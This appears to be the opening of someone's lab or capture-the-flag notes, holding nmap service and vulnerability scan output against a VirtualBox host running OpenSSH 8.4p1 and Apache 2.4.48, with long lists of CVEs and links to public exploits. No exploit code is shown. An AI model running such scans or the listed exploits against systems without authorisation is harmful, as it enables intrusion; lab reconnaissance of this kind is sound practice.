
![[Pasted image 20261015233145.png]]


```
nmap -sV -sC -p- 192.168.0.105 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-15 13:33 -0400
Nmap scan report for 192.168.0.105
Host is up (0.0031s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 ed:ea:d9:d3:af:19:9c:8e:4e:0f:31:db:f2:5d:12:79 (RSA)
|   256 bf:9f:a9:93:c5:87:21:a3:6b:6f:9e:e6:87:61:f5:19 (ECDSA)
|_  256 ac:18:ec:cc:35:c0:51:f5:6f:47:74:c3:01:95:b4:0f (ED25519)
80/tcp open  http    Apache httpd 2.4.48 ((Debian))
|_http-title: Site doesn't have a title (text/html).
| http-robots.txt: 1 disallowed entry 
|_/~myfiles
|_http-server-header: Apache/2.4.48 (Debian)
MAC Address: 08:00:27:5C:9A:A0 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.12 seconds

```


```
# Nmap 7.99 scan initiated Thu Oct 15 13:38:44 2026 as: /usr/lib/nmap/nmap -sV --script vuln -o nmap.txt 192.168.0.105
Nmap scan report for 192.168.0.105
Host is up (0.0035s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:8.4p1: 
|     	PACKETSTORM:173661	9.8	https://vulners.com/packetstorm/PACKETSTORM:173661	*EXPLOIT*
|     	F0979183-AE88-53B4-86CF-3AF0523F3807	9.8	https://vulners.com/githubexploit/F0979183-AE88-53B4-86CF-3AF0523F3807	*EXPLOIT*
|     	CVE-2023-38408	9.8	https://vulners.com/cve/CVE-2023-38408
|     	B8190CDB-3EB9-5631-9828-8064A1575B23	9.8	https://vulners.com/githubexploit/B8190CDB-3EB9-5631-9828-8064A1575B23	*EXPLOIT*
|     	A2B36B85-C737-548F-8C04-9339EDCDBFF5	9.8	https://vulners.com/githubexploit/A2B36B85-C737-548F-8C04-9339EDCDBFF5	*EXPLOIT*
|     	8FC9C5AB-3968-5F3C-825E-E8DB5379A623	9.8	https://vulners.com/githubexploit/8FC9C5AB-3968-5F3C-825E-E8DB5379A623	*EXPLOIT*
|     	8AD01159-548E-546E-AA87-2DE89F3927EC	9.8	https://vulners.com/githubexploit/8AD01159-548E-546E-AA87-2DE89F3927EC	*EXPLOIT*
|     	6192C35D-F78B-5C0A-AB8D-9826A79A5320	9.8	https://vulners.com/githubexploit/6192C35D-F78B-5C0A-AB8D-9826A79A5320	*EXPLOIT*
|     	2227729D-6700-5C8F-8930-1EEAFD4B9FF0	9.8	https://vulners.com/githubexploit/2227729D-6700-5C8F-8930-1EEAFD4B9FF0	*EXPLOIT*
|     	0221525F-07F5-5790-912D-F4B9E2D1B587	9.8	https://vulners.com/githubexploit/0221525F-07F5-5790-912D-F4B9E2D1B587	*EXPLOIT*
|     	CVE-2026-60002	9.4	https://vulners.com/cve/CVE-2026-60002
|     	CVE-2026-35414	8.1	https://vulners.com/cve/CVE-2026-35414
|     	CVE-2026-35386	8.1	https://vulners.com/cve/CVE-2026-35386
|     	CVE-2026-35385	8.1	https://vulners.com/cve/CVE-2026-35385
|     	BA3887BD-F579-53B1-A4A4-FF49E953E1C0	8.1	https://vulners.com/githubexploit/BA3887BD-F579-53B1-A4A4-FF49E953E1C0	*EXPLOIT*
|     	4FB01B00-F993-5CAF-BD57-D7E290D10C1F	8.1	https://vulners.com/githubexploit/4FB01B00-F993-5CAF-BD57-D7E290D10C1F	*EXPLOIT*
|     	CVE-2026-106583	7.8	https://vulners.com/cve/CVE-2026-106583
|     	991D2CC4-0E09-5745-97A2-4917461BD6EC	7.8	https://vulners.com/githubexploit/991D2CC4-0E09-5745-97A2-4917461BD6EC	*EXPLOIT*
|     	CVE-2026-60000	7.5	https://vulners.com/cve/CVE-2026-60000
|     	CVE-2026-59999	7.5	https://vulners.com/cve/CVE-2026-59999
|     	CVE-2026-106555	7.5	https://vulners.com/cve/CVE-2026-106555
|     	CVE-2026-106553	7.5	https://vulners.com/cve/CVE-2026-106553
|     	CVE-2021-28041	7.1	https://vulners.com/cve/CVE-2021-28041
|     	CVE-2021-41617	7.0	https://vulners.com/cve/CVE-2021-41617
|     	284B94FC-FD5D-5C47-90EA-47900DAD1D1E	7.0	https://vulners.com/githubexploit/284B94FC-FD5D-5C47-90EA-47900DAD1D1E	*EXPLOIT*
|     	PACKETSTORM:189283	6.8	https://vulners.com/packetstorm/PACKETSTORM:189283	*EXPLOIT*
|     	CVE-2025-26465	6.8	https://vulners.com/cve/CVE-2025-26465
|     	9D8432B9-49EC-5F45-BB96-329B1F2B2254	6.8	https://vulners.com/githubexploit/9D8432B9-49EC-5F45-BB96-329B1F2B2254	*EXPLOIT*
|     	85FCDCC6-9A03-597E-AB4F-FA4DAC04F8D0	6.8	https://vulners.com/githubexploit/85FCDCC6-9A03-597E-AB4F-FA4DAC04F8D0	*EXPLOIT*
|     	1337DAY-ID-39918	6.8	https://vulners.com/zdt/1337DAY-ID-39918	*EXPLOIT*
|     	DB7C1CC7-4DB6-55E0-BC0B-5059FBF3AE16	6.5	https://vulners.com/githubexploit/DB7C1CC7-4DB6-55E0-BC0B-5059FBF3AE16	*EXPLOIT*
|     	D104D2BF-ED22-588B-A9B2-3CCC562FE8C0	6.5	https://vulners.com/githubexploit/D104D2BF-ED22-588B-A9B2-3CCC562FE8C0	*EXPLOIT*
|     	CVE-2026-60001	6.5	https://vulners.com/cve/CVE-2026-60001
|     	CVE-2026-59998	6.5	https://vulners.com/cve/CVE-2026-59998
|     	CVE-2026-35387	6.5	https://vulners.com/cve/CVE-2026-35387
|     	CVE-2026-106585	6.5	https://vulners.com/cve/CVE-2026-106585
|     	CVE-2026-106552	6.5	https://vulners.com/cve/CVE-2026-106552
|     	CVE-2023-51385	6.5	https://vulners.com/cve/CVE-2023-51385
|     	C07ADB46-24B8-57B7-B375-9C761F4750A2	6.5	https://vulners.com/githubexploit/C07ADB46-24B8-57B7-B375-9C761F4750A2	*EXPLOIT*
|     	A88CDD3E-67CC-51CC-97FB-AB0CACB6B08C	6.5	https://vulners.com/githubexploit/A88CDD3E-67CC-51CC-97FB-AB0CACB6B08C	*EXPLOIT*
|     	65B15AA1-2A8D-53C1-9499-69EBA3619F1C	6.5	https://vulners.com/githubexploit/65B15AA1-2A8D-53C1-9499-69EBA3619F1C	*EXPLOIT*
|     	5325A9D6-132B-590C-BDEF-0CB105252732	6.5	https://vulners.com/gitee/5325A9D6-132B-590C-BDEF-0CB105252732	*EXPLOIT*
|     	530326CF-6AB3-5643-AA16-73DC8CB44742	6.5	https://vulners.com/githubexploit/530326CF-6AB3-5643-AA16-73DC8CB44742	*EXPLOIT*
|     	FD2E0EBA-ED84-5304-8862-84BCDEB2F288	5.9	https://vulners.com/githubexploit/FD2E0EBA-ED84-5304-8862-84BCDEB2F288	*EXPLOIT*
|     	CVE-2023-48795	5.9	https://vulners.com/cve/CVE-2023-48795
|     	CVE-2020-14145	5.9	https://vulners.com/cve/CVE-2020-14145
|     	CNVD-2021-25272	5.9	https://vulners.com/cnvd/CNVD-2021-25272
|     	999F3EF8-6D45-5F10-A4C8-6185D82D4552	5.9	https://vulners.com/githubexploit/999F3EF8-6D45-5F10-A4C8-6185D82D4552	*EXPLOIT*
|     	721F040C-37BC-59E1-9433-01A2EAC2E755	5.9	https://vulners.com/githubexploit/721F040C-37BC-59E1-9433-01A2EAC2E755	*EXPLOIT*
|     	6D74A425-60A7-557A-B469-1DD96A2D8FF8	5.9	https://vulners.com/githubexploit/6D74A425-60A7-557A-B469-1DD96A2D8FF8	*EXPLOIT*
|     	CVE-2026-59997	5.4	https://vulners.com/cve/CVE-2026-59997
|     	CVE-2026-59996	5.4	https://vulners.com/cve/CVE-2026-59996
|     	CVE-2026-59995	5.4	https://vulners.com/cve/CVE-2026-59995
|     	CVE-2016-20012	5.3	https://vulners.com/cve/CVE-2016-20012
|     	CVE-2026-73282	4.8	https://vulners.com/cve/CVE-2026-73282
|     	CVE-2026-106586	4.3	https://vulners.com/cve/CVE-2026-106586
|     	CVE-2025-32728	4.3	https://vulners.com/cve/CVE-2025-32728
|     	CVE-2026-106582	3.7	https://vulners.com/cve/CVE-2026-106582
|     	CVE-2021-36368	3.7	https://vulners.com/cve/CVE-2021-36368
|     	CVE-2026-106587	3.6	https://vulners.com/cve/CVE-2026-106587
|     	CVE-2025-61985	3.6	https://vulners.com/cve/CVE-2025-61985
|     	CVE-2025-61984	3.6	https://vulners.com/cve/CVE-2025-61984
|     	B7EACB4F-A5CF-5C5A-809F-E03CCE2AB150	3.6	https://vulners.com/githubexploit/B7EACB4F-A5CF-5C5A-809F-E03CCE2AB150	*EXPLOIT*
|     	4C6E2182-0E99-5626-83F6-1646DD648C57	3.6	https://vulners.com/githubexploit/4C6E2182-0E99-5626-83F6-1646DD648C57	*EXPLOIT*
|     	CVE-2026-73281	3.5	https://vulners.com/cve/CVE-2026-73281
|     	CVE-2026-106584	3.3	https://vulners.com/cve/CVE-2026-106584
|     	CVE-2026-106588	3.1	https://vulners.com/cve/CVE-2026-106588
|     	CVE-2026-106589	2.9	https://vulners.com/cve/CVE-2026-106589
|     	CVE-2026-73283	2.5	https://vulners.com/cve/CVE-2026-73283
|_    	CVE-2026-35388	2.5	https://vulners.com/cve/CVE-2026-35388
80/tcp open  http    Apache httpd 2.4.48 ((Debian))
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-server-header: Apache/2.4.48 (Debian)
| vulners: 
|   cpe:/a:apache:http_server:2.4.48: 
|     	PACKETSTORM:176334	9.8	https://vulners.com/packetstorm/PACKETSTORM:176334	*EXPLOIT*
|     	PACKETSTORM:171631	9.8	https://vulners.com/packetstorm/PACKETSTORM:171631	*EXPLOIT*
|     	MEND:CVE-2026-59797	9.8	https://vulners.com/mend/MEND:CVE-2026-59797
|     	MEND:CVE-2026-56154	9.8	https://vulners.com/mend/MEND:CVE-2026-56154
|     	MEND:CVE-2026-44631	9.8	https://vulners.com/mend/MEND:CVE-2026-44631
|     	MEND:CVE-2026-29167	9.8	https://vulners.com/mend/MEND:CVE-2026-29167
|     	HTTPD:C072933AA965A86DA3E2C9172FFC1569	9.8	https://vulners.com/httpd/HTTPD:C072933AA965A86DA3E2C9172FFC1569
|     	HTTPD:A1BBCE110E077FFBF4469D4F06DB9293	9.8	https://vulners.com/httpd/HTTPD:A1BBCE110E077FFBF4469D4F06DB9293
|     	HTTPD:A09F9CEBE0B7C39EDA0480FEAEF4FE9D	9.8	https://vulners.com/httpd/HTTPD:A09F9CEBE0B7C39EDA0480FEAEF4FE9D
|     	HTTPD:9BCBE3C14201AFC4B0F36F15CB40C0F8	9.8	https://vulners.com/httpd/HTTPD:9BCBE3C14201AFC4B0F36F15CB40C0F8
|     	HTTPD:2BE0032A6ABE7CC52906DBAAFE0E448E	9.8	https://vulners.com/httpd/HTTPD:2BE0032A6ABE7CC52906DBAAFE0E448E
|     	EDB-ID:51193	9.8	https://vulners.com/exploitdb/EDB-ID:51193	*EXPLOIT*
|     	EAA88933-B773-535C-8E65-20383D59A2FE	9.8	https://vulners.com/githubexploit/EAA88933-B773-535C-8E65-20383D59A2FE	*EXPLOIT*
|     	D5084D51-C8DF-5CBA-BC26-ACF2E33F8E52	9.8	https://vulners.com/githubexploit/D5084D51-C8DF-5CBA-BC26-ACF2E33F8E52	*EXPLOIT*
|     	CVE-2026-59797	9.8	https://vulners.com/cve/CVE-2026-59797
|     	CVE-2026-57941	9.8	https://vulners.com/cve/CVE-2026-57941
|     	CVE-2026-56154	9.8	https://vulners.com/cve/CVE-2026-56154
|     	CVE-2026-44631	9.8	https://vulners.com/cve/CVE-2026-44631
|     	CVE-2026-29167	9.8	https://vulners.com/cve/CVE-2026-29167
|     	CVE-2026-28780	9.8	https://vulners.com/cve/CVE-2026-28780
|     	CVE-2024-38476	9.8	https://vulners.com/cve/CVE-2024-38476
|     	CVE-2024-38474	9.8	https://vulners.com/cve/CVE-2024-38474
|     	CVE-2023-25690	9.8	https://vulners.com/cve/CVE-2023-25690
|     	CVE-2022-31813	9.8	https://vulners.com/cve/CVE-2022-31813
|     	CVE-2022-23943	9.8	https://vulners.com/cve/CVE-2022-23943
|     	CVE-2022-22720	9.8	https://vulners.com/cve/CVE-2022-22720
|     	CVE-2021-44790	9.8	https://vulners.com/cve/CVE-2021-44790
|     	CVE-2021-39275	9.8	https://vulners.com/cve/CVE-2021-39275
|     	CNVD-2024-36391	9.8	https://vulners.com/cnvd/CNVD-2024-36391
|     	CNVD-2024-36388	9.8	https://vulners.com/cnvd/CNVD-2024-36388
|     	CNVD-2022-51061	9.8	https://vulners.com/cnvd/CNVD-2022-51061
|     	CNVD-2022-41640	9.8	https://vulners.com/cnvd/CNVD-2022-41640
|     	CNVD-2022-03225	9.8	https://vulners.com/cnvd/CNVD-2022-03225
|     	CNVD-2021-102386	9.8	https://vulners.com/cnvd/CNVD-2021-102386
|     	A8E17CED-DB4F-5C45-A53C-B855BE32362A	9.8	https://vulners.com/githubexploit/A8E17CED-DB4F-5C45-A53C-B855BE32362A	*EXPLOIT*
|     	64A540A8-D918-5BEA-8F60-987F97B27A0C	9.8	https://vulners.com/githubexploit/64A540A8-D918-5BEA-8F60-987F97B27A0C	*EXPLOIT*
|     	5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9	9.8	https://vulners.com/githubexploit/5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9	*EXPLOIT*
|     	4DFF7163-45F2-5F1B-8C53-0A2457A04735	9.8	https://vulners.com/githubexploit/4DFF7163-45F2-5F1B-8C53-0A2457A04735	*EXPLOIT*
|     	3F17CA20-788F-5C45-88B3-E12DB2979B7B	9.8	https://vulners.com/githubexploit/3F17CA20-788F-5C45-88B3-E12DB2979B7B	*EXPLOIT*
|     	1337DAY-ID-39214	9.8	https://vulners.com/zdt/1337DAY-ID-39214	*EXPLOIT*
|     	1337DAY-ID-38427	9.8	https://vulners.com/zdt/1337DAY-ID-38427	*EXPLOIT*
|     	MEND:CVE-2025-23048	9.3	https://vulners.com/mend/MEND:CVE-2025-23048
|     	MEND:CVE-2026-73636	9.2	https://vulners.com/mend/MEND:CVE-2026-73636
|     	PACKETSTORM:213257	9.1	https://vulners.com/packetstorm/PACKETSTORM:213257	*EXPLOIT*
|     	MEND:CVE-2026-42535	9.1	https://vulners.com/mend/MEND:CVE-2026-42535
|     	MEND:CVE-2025-49812	9.1	https://vulners.com/mend/MEND:CVE-2025-49812
|     	KS:SCANNER-HTTP-CVE_2024_38475_DETECT	9.1	https://vulners.com/kittysploit/KS:SCANNER-HTTP-CVE_2024_38475_DETECT	*EXPLOIT*
|     	HTTPD:509B04B8CC51879DD0A561AC4FDBE0A6	9.1	https://vulners.com/httpd/HTTPD:509B04B8CC51879DD0A561AC4FDBE0A6
|     	HTTPD:2C227652EE0B3B961706AAFCACA3D1E1	9.1	https://vulners.com/httpd/HTTPD:2C227652EE0B3B961706AAFCACA3D1E1
|     	FD2EE3A5-BAEA-5845-BA35-E6889992214F	9.1	https://vulners.com/githubexploit/FD2EE3A5-BAEA-5845-BA35-E6889992214F	*EXPLOIT*
|     	FBC8A8BE-F00A-5B6D-832E-F99A72E7A3F7	9.1	https://vulners.com/githubexploit/FBC8A8BE-F00A-5B6D-832E-F99A72E7A3F7	*EXPLOIT*
|     	E606D7F4-5FA2-5907-B30E-367D6FFECD89	9.1	https://vulners.com/githubexploit/E606D7F4-5FA2-5907-B30E-367D6FFECD89	*EXPLOIT*
|     	D8A19443-2A37-5592-8955-F614504AAF45	9.1	https://vulners.com/githubexploit/D8A19443-2A37-5592-8955-F614504AAF45	*EXPLOIT*
|     	CVE-2026-89282	9.1	https://vulners.com/cve/CVE-2026-89282
|     	CVE-2026-42535	9.1	https://vulners.com/cve/CVE-2026-42535
|     	CVE-2025-23048	9.1	https://vulners.com/cve/CVE-2025-23048
|     	CVE-2024-40898	9.1	https://vulners.com/cve/CVE-2024-40898
|     	CVE-2024-38475	9.1	https://vulners.com/cve/CVE-2024-38475
|     	CVE-2022-28615	9.1	https://vulners.com/cve/CVE-2022-28615
|     	CVE-2022-22721	9.1	https://vulners.com/cve/CVE-2022-22721
|     	CNVD-2025-16610	9.1	https://vulners.com/cnvd/CNVD-2025-16610
|     	CNVD-2024-36387	9.1	https://vulners.com/cnvd/CNVD-2024-36387
|     	CNVD-2024-33814	9.1	https://vulners.com/cnvd/CNVD-2024-33814
|     	CNVD-2022-51060	9.1	https://vulners.com/cnvd/CNVD-2022-51060
|     	CNVD-2022-41638	9.1	https://vulners.com/cnvd/CNVD-2022-41638
|     	B5E74010-A082-5ECE-AB37-623A5B33FE7D	9.1	https://vulners.com/githubexploit/B5E74010-A082-5ECE-AB37-623A5B33FE7D	*EXPLOIT*
|     	5418A85B-F4B7-5BBD-B106-0800AC961C7A	9.1	https://vulners.com/githubexploit/5418A85B-F4B7-5BBD-B106-0800AC961C7A	*EXPLOIT*
|     	HTTPD:1B3D546A8500818AAC5B1359FE11A7E4	9.0	https://vulners.com/httpd/HTTPD:1B3D546A8500818AAC5B1359FE11A7E4
|     	CVE-2022-36760	9.0	https://vulners.com/cve/CVE-2022-36760
|     	CVE-2021-40438	9.0	https://vulners.com/cve/CVE-2021-40438
|     	CNVD-2023-30860	9.0	https://vulners.com/cnvd/CNVD-2023-30860
|     	CNVD-2022-03224	9.0	https://vulners.com/cnvd/CNVD-2022-03224
|     	AE3EF1CC-A0C3-5CB7-A6EF-4DAAAFA59C8C	9.0	https://vulners.com/githubexploit/AE3EF1CC-A0C3-5CB7-A6EF-4DAAAFA59C8C	*EXPLOIT*
|     	9D9B3F4D-6B5C-5377-BE39-F1C432C9E457	9.0	https://vulners.com/githubexploit/9D9B3F4D-6B5C-5377-BE39-F1C432C9E457	*EXPLOIT*
|     	8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2	9.0	https://vulners.com/githubexploit/8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2	*EXPLOIT*
|     	7F48C6CF-47B2-5AF9-B6FD-1735FB2A95B2	9.0	https://vulners.com/githubexploit/7F48C6CF-47B2-5AF9-B6FD-1735FB2A95B2	*EXPLOIT*
|     	36618CA8-9316-59CA-B748-82F15F407C4F	9.0	https://vulners.com/githubexploit/36618CA8-9316-59CA-B748-82F15F407C4F	*EXPLOIT*
|     	MEND:CVE-2026-93546	8.8	https://vulners.com/mend/MEND:CVE-2026-93546
|     	MEND:CVE-2026-24072	8.8	https://vulners.com/mend/MEND:CVE-2026-24072
|     	CVE-2026-93546	8.8	https://vulners.com/cve/CVE-2026-93546
|     	CVE-2026-24072	8.8	https://vulners.com/cve/CVE-2026-24072
|     	40379BCA-07F4-5401-B618-4640793D350D	8.8	https://vulners.com/githubexploit/40379BCA-07F4-5401-B618-4640793D350D	*EXPLOIT*
|     	MEND:CVE-2026-63718	8.7	https://vulners.com/mend/MEND:CVE-2026-63718
|     	MEND:CVE-2026-63686	8.7	https://vulners.com/mend/MEND:CVE-2026-63686
|     	MEND:CVE-2026-63292	8.7	https://vulners.com/mend/MEND:CVE-2026-63292
|     	MEND:CVE-2026-63045	8.7	https://vulners.com/mend/MEND:CVE-2026-63045
|     	MEND:CVE-2026-59685	8.7	https://vulners.com/mend/MEND:CVE-2026-59685
|     	MEND:CVE-2026-56153	8.7	https://vulners.com/mend/MEND:CVE-2026-56153
|     	MEND:CVE-2026-49975	8.7	https://vulners.com/mend/MEND:CVE-2026-49975
|     	MEND:CVE-2026-48005	8.7	https://vulners.com/mend/MEND:CVE-2026-48005
|     	MEND:CVE-2026-47360	8.7	https://vulners.com/mend/MEND:CVE-2026-47360
|     	MEND:CVE-2026-46729	8.7	https://vulners.com/mend/MEND:CVE-2026-46729
|     	MEND:CVE-2026-42536	8.7	https://vulners.com/mend/MEND:CVE-2026-42536
|     	MEND:CVE-2026-34356	8.7	https://vulners.com/mend/MEND:CVE-2026-34356
|     	MEND:CVE-2026-34355	8.7	https://vulners.com/mend/MEND:CVE-2026-34355
|     	MEND:CVE-2026-34059	8.7	https://vulners.com/mend/MEND:CVE-2026-34059
|     	MEND:CVE-2026-29169	8.7	https://vulners.com/mend/MEND:CVE-2026-29169
|     	MEND:CVE-2025-59775	8.7	https://vulners.com/mend/MEND:CVE-2025-59775
|     	MEND:CVE-2025-58098	8.7	https://vulners.com/mend/MEND:CVE-2025-58098
|     	MEND:CVE-2025-55753	8.7	https://vulners.com/mend/MEND:CVE-2025-55753
|     	MEND:CVE-2025-53020	8.7	https://vulners.com/mend/MEND:CVE-2025-53020
|     	MEND:CVE-2025-49630	8.7	https://vulners.com/mend/MEND:CVE-2025-49630
|     	MEND:CVE-2024-47252	8.7	https://vulners.com/mend/MEND:CVE-2024-47252
|     	MEND:CVE-2024-43204	8.7	https://vulners.com/mend/MEND:CVE-2024-43204
|     	MEND:CVE-2024-42516	8.7	https://vulners.com/mend/MEND:CVE-2024-42516
|     	CVE-2026-89281	8.4	https://vulners.com/cve/CVE-2026-89281
|     	CVE-2025-58098	8.3	https://vulners.com/cve/CVE-2025-58098
|     	HTTPD:A7133572D328CD65C350E33F20834FAD	8.2	https://vulners.com/httpd/HTTPD:A7133572D328CD65C350E33F20834FAD
|     	CVE-2021-44224	8.2	https://vulners.com/cve/CVE-2021-44224
|     	CNVD-2021-102387	8.2	https://vulners.com/cnvd/CNVD-2021-102387
|     	B0A9E5E8-7CCC-5984-9922-A89F11D6BF38	8.2	https://vulners.com/githubexploit/B0A9E5E8-7CCC-5984-9922-A89F11D6BF38	*EXPLOIT*
|     	CVE-2026-73636	8.1	https://vulners.com/cve/CVE-2026-73636
|     	CVE-2024-38473	8.1	https://vulners.com/cve/CVE-2024-38473
|     	23079A70-8B37-56D2-9D37-F638EBF7F8B5	8.1	https://vulners.com/githubexploit/23079A70-8B37-56D2-9D37-F638EBF7F8B5	*EXPLOIT*
|     	HTTPD:F6C47B71D440F1A5B8EC9883D1516A33	7.5	https://vulners.com/httpd/HTTPD:F6C47B71D440F1A5B8EC9883D1516A33
|     	HTTPD:F1CFBC9B54DFAD0499179863D36830BB	7.5	https://vulners.com/httpd/HTTPD:F1CFBC9B54DFAD0499179863D36830BB
|     	HTTPD:C317C7138B4A8BBD54A901D6DDDCB837	7.5	https://vulners.com/httpd/HTTPD:C317C7138B4A8BBD54A901D6DDDCB837
|     	HTTPD:C1F57FDC580B58497A5EC5B7D3749F2F	7.5	https://vulners.com/httpd/HTTPD:C1F57FDC580B58497A5EC5B7D3749F2F
|     	HTTPD:B1B0A31C4AD388CC6C575931414173E2	7.5	https://vulners.com/httpd/HTTPD:B1B0A31C4AD388CC6C575931414173E2
|     	HTTPD:8D3D8562E77EAD24FA6850949D025BC9	7.5	https://vulners.com/httpd/HTTPD:8D3D8562E77EAD24FA6850949D025BC9
|     	HTTPD:5E6BCDB2F7C53E4EDCE844709D930AF5	7.5	https://vulners.com/httpd/HTTPD:5E6BCDB2F7C53E4EDCE844709D930AF5
|     	EDEE9204-2DB4-5931-983F-6C7DB7FD4FB7	7.5	https://vulners.com/githubexploit/EDEE9204-2DB4-5931-983F-6C7DB7FD4FB7	*EXPLOIT*
|     	CVE-2026-63718	7.5	https://vulners.com/cve/CVE-2026-63718
|     	CVE-2026-63686	7.5	https://vulners.com/cve/CVE-2026-63686
|     	CVE-2026-63292	7.5	https://vulners.com/cve/CVE-2026-63292
|     	CVE-2026-63045	7.5	https://vulners.com/cve/CVE-2026-63045
|     	CVE-2026-59685	7.5	https://vulners.com/cve/CVE-2026-59685
|     	CVE-2026-56449	7.5	https://vulners.com/cve/CVE-2026-56449
|     	CVE-2026-56153	7.5	https://vulners.com/cve/CVE-2026-56153
|     	CVE-2026-49975	7.5	https://vulners.com/cve/CVE-2026-49975
|     	CVE-2026-48005	7.5	https://vulners.com/cve/CVE-2026-48005
|     	CVE-2026-46729	7.5	https://vulners.com/cve/CVE-2026-46729
|     	CVE-2026-42536	7.5	https://vulners.com/cve/CVE-2026-42536
|     	CVE-2026-34356	7.5	https://vulners.com/cve/CVE-2026-34356
|     	CVE-2026-34355	7.5	https://vulners.com/cve/CVE-2026-34355
|     	CVE-2026-34059	7.5	https://vulners.com/cve/CVE-2026-34059
|     	CVE-2026-29169	7.5	https://vulners.com/cve/CVE-2026-29169
|     	CVE-2025-59775	7.5	https://vulners.com/cve/CVE-2025-59775
|     	CVE-2025-55753	7.5	https://vulners.com/cve/CVE-2025-55753
|     	CVE-2025-53020	7.5	https://vulners.com/cve/CVE-2025-53020
|     	CVE-2025-49630	7.5	https://vulners.com/cve/CVE-2025-49630
|     	CVE-2024-47252	7.5	https://vulners.com/cve/CVE-2024-47252
|     	CVE-2024-43394	7.5	https://vulners.com/cve/CVE-2024-43394
|     	CVE-2024-43204	7.5	https://vulners.com/cve/CVE-2024-43204
|     	CVE-2024-42516	7.5	https://vulners.com/cve/CVE-2024-42516
|     	CVE-2024-39573	7.5	https://vulners.com/cve/CVE-2024-39573
|     	CVE-2024-38477	7.5	https://vulners.com/cve/CVE-2024-38477
|     	CVE-2024-38472	7.5	https://vulners.com/cve/CVE-2024-38472
|     	CVE-2024-27316	7.5	https://vulners.com/cve/CVE-2024-27316
|     	CVE-2023-31122	7.5	https://vulners.com/cve/CVE-2023-31122
|     	CVE-2023-27522	7.5	https://vulners.com/cve/CVE-2023-27522
|     	CVE-2022-30556	7.5	https://vulners.com/cve/CVE-2022-30556
|     	CVE-2022-29404	7.5	https://vulners.com/cve/CVE-2022-29404
|     	CVE-2022-26377	7.5	https://vulners.com/cve/CVE-2022-26377
|     	CVE-2022-22719	7.5	https://vulners.com/cve/CVE-2022-22719
|     	CVE-2021-36160	7.5	https://vulners.com/cve/CVE-2021-36160
|     	CVE-2021-34798	7.5	https://vulners.com/cve/CVE-2021-34798
|     	CVE-2021-33193	7.5	https://vulners.com/cve/CVE-2021-33193
|     	CVE-2006-20001	7.5	https://vulners.com/cve/CVE-2006-20001
|     	CNVD-2025-30837	7.5	https://vulners.com/cnvd/CNVD-2025-30837
|     	CNVD-2025-30836	7.5	https://vulners.com/cnvd/CNVD-2025-30836
|     	CNVD-2025-16614	7.5	https://vulners.com/cnvd/CNVD-2025-16614
|     	CNVD-2025-16613	7.5	https://vulners.com/cnvd/CNVD-2025-16613
|     	CNVD-2025-16612	7.5	https://vulners.com/cnvd/CNVD-2025-16612
|     	CNVD-2025-16609	7.5	https://vulners.com/cnvd/CNVD-2025-16609
|     	CNVD-2025-16608	7.5	https://vulners.com/cnvd/CNVD-2025-16608
|     	CNVD-2025-16603	7.5	https://vulners.com/cnvd/CNVD-2025-16603
|     	CNVD-2024-36393	7.5	https://vulners.com/cnvd/CNVD-2024-36393
|     	CNVD-2024-36390	7.5	https://vulners.com/cnvd/CNVD-2024-36390
|     	CNVD-2024-36389	7.5	https://vulners.com/cnvd/CNVD-2024-36389
|     	CNVD-2024-20839	7.5	https://vulners.com/cnvd/CNVD-2024-20839
|     	CNVD-2023-93320	7.5	https://vulners.com/cnvd/CNVD-2023-93320
|     	CNVD-2023-80558	7.5	https://vulners.com/cnvd/CNVD-2023-80558
|     	CNVD-2022-53584	7.5	https://vulners.com/cnvd/CNVD-2022-53584
|     	CNVD-2022-51058	7.5	https://vulners.com/cnvd/CNVD-2022-51058
|     	CNVD-2022-41639	7.5	https://vulners.com/cnvd/CNVD-2022-41639
|     	CNVD-2022-03223	7.5	https://vulners.com/cnvd/CNVD-2022-03223
|     	CNVD-2022-03205	7.5	https://vulners.com/cnvd/CNVD-2022-03205
|     	CDC791CD-A414-5ABE-A897-7CFA3C2D3D29	7.5	https://vulners.com/githubexploit/CDC791CD-A414-5ABE-A897-7CFA3C2D3D29	*EXPLOIT*
|     	C2EB4AA1-0C70-5104-AF4C-BC274F5A5B7A	7.5	https://vulners.com/githubexploit/C2EB4AA1-0C70-5104-AF4C-BC274F5A5B7A	*EXPLOIT*
|     	A5675239-3520-5F86-A975-8C0FBB77C2A9	7.5	https://vulners.com/githubexploit/A5675239-3520-5F86-A975-8C0FBB77C2A9	*EXPLOIT*
|     	A0F268C8-7319-5637-82F7-8DAF72D14629	7.5	https://vulners.com/githubexploit/A0F268C8-7319-5637-82F7-8DAF72D14629	*EXPLOIT*
|     	92C0957A-F7CF-5B24-B6B3-B6B5F0C22EC9	7.5	https://vulners.com/githubexploit/92C0957A-F7CF-5B24-B6B3-B6B5F0C22EC9	*EXPLOIT*
|     	8A1A8D98-62D2-5A2D-8D42-694C66E0D1C4	7.5	https://vulners.com/githubexploit/8A1A8D98-62D2-5A2D-8D42-694C66E0D1C4	*EXPLOIT*
|     	83A428C4-BFA1-573B-A05F-7E0A55E119C5	7.5	https://vulners.com/githubexploit/83A428C4-BFA1-573B-A05F-7E0A55E119C5	*EXPLOIT*
|     	742112F7-4755-5E94-8DD2-899160B59E5E	7.5	https://vulners.com/githubexploit/742112F7-4755-5E94-8DD2-899160B59E5E	*EXPLOIT*
|     	5B7082BE-022C-5DCA-BCDA-0F8EDD0E5085	7.5	https://vulners.com/githubexploit/5B7082BE-022C-5DCA-BCDA-0F8EDD0E5085	*EXPLOIT*
